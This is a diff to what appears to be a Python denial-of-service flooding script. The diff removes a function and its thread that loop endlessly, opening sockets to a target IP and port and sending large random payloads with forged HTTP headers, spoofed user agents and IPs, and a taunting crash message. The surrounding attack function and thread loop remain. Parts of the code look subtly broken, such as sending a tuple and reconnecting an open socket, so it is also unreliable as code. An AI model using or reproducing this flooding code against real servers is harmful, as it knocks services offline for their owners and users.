@@ -898,38 +898,12 @@ def attck():
         except:
             s.close()
             print('[+] server error')
-def join2():
-  global useragent2,socks5,userip,acceptall
-  data5 = random._urandom(80000)
-  xx = int(0)
-  useragentl = "UserAgents: "+random.choice(useragent2)+random.choice(userip)+"\r\n"
-  acceptlol = random.choice(acceptall)
-  sockl = random.choice(socks5)+"\r\n"
-  content = "Content-Type: application/x-www-form-urlencoded\r\n"
-  length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-  main_req = useragentl + acceptlol + sockl + content + length + "\r\n"
-  while True:
-        try:
-           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-           s.connect((str(ip),int(port)))
-           s.send((data5))
-           s.send((main_req))
-           for i in range(pack):
-               s.connect((str(ip),int(port)))
-               s.send((data5,data3,data2))
-               s.send((main_req))
-           xx += random.randint(0, int(pack))
-           print("SÉRVÉR {1} CRÂSH BY ZÁN")
-        except:
-            s.close()
-            print('[+] server error')
+
            
 for x in range(th):
   th = threading.Thread(target=start)
   th2 = threading.Thread(target=attck)
-  th3 = threading.Thread(target=join2)
   th.start()
   th2.start()
-  th3.start()
   
   
